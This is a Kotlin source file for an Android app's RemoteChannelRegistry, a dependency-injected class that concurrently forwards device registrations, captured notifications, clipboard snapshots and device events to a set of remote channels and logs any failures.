package com.xeg911.appclient.data.remote.channel

import android.util.Log
import com.xeg911.shared.data.model.CapturedNotification
import com.xeg911.shared.data.model.ClipboardSnapshot
import com.xeg911.shared.data.model.DeviceRegistration
import com.xeg911.shared.data.model.event.DeviceEvent
import com.xeg911.shared.data.remote.channel.RemoteChannel
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.supervisorScope
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class RemoteChannelRegistry @Inject constructor(
    private val channels: Set<@JvmSuppressWildcards RemoteChannel>
) {
    suspend fun registerDevice(registration: DeviceRegistration) =
        dispatch("registerDevice", requireEnabled = false) { it.registerDevice(registration) }

    suspend fun sendNotification(notification: CapturedNotification) =
        dispatch("sendNotification") { it.sendNotification(notification) }

    suspend fun sendClipboard(snapshot: ClipboardSnapshot) =
        dispatch("sendClipboard") { it.sendClipboard(snapshot) }

    suspend fun sendEvent(event: DeviceEvent) =
        dispatch("sendEvent:${event.type}") { it.sendEvent(event) }

    private suspend fun dispatch(
        operation: String,
        requireEnabled: Boolean = true,
        block: suspend (RemoteChannel) -> Result<Unit>,
    ) {
        supervisorScope {
            channels.map { channel ->
                async {
                    runCatching {
                        if (requireEnabled && !channel.isEnabled()) return@async
                        block(channel).getOrThrow()
                    }.onFailure {
                        Log.w(TAG, "[${channel.channelId}] $operation failed", it)
                    }
                }
            }.awaitAll()
        }
    }

    private companion object {
        const val TAG = "RemoteChannelRegistry"
    }
}
